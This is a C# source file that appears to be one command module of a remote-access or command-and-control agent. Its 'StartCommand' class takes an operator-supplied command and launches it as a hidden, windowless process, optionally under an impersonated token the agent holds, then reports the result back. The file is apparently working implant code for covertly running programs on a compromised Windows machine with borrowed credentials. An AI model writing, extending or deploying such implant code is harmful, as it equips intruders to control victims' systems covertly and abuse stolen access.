
using Agent.Helpers;
using Agent.Models;
using Shared;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using WinAPI;
using WinAPI.Wrapper;

namespace Agent.Commands
{
    public class StartCommand : AgentCommand
    {
        public override CommandId Command => CommandId.Start;
        public override async Task InnerExecute(AgentTask task, AgentCommandContext context, CancellationToken token)
        {
            task.ThrowIfParameterMissing(ParameterId.Command);
            string cmd = task.GetParameter<string>(ParameterId.Command);

            var creationParms = new ProcessCreationParameters()
            {
                Application = cmd,
                RedirectOutput = false,
                CreateNoWindow = true,
                CurrentDirectory = Environment.CurrentDirectory
            };

            if (context.Agent.ImpersonationToken != IntPtr.Zero)
                creationParms.Token = context.Agent.ImpersonationToken;

            var procResult = APIWrapper.CreateProcess(creationParms);
            if(procResult.ProcessId == 0)
                context.Error("Process start failed!");
            else
                context.AppendResult("Process started");
        }
    }
}
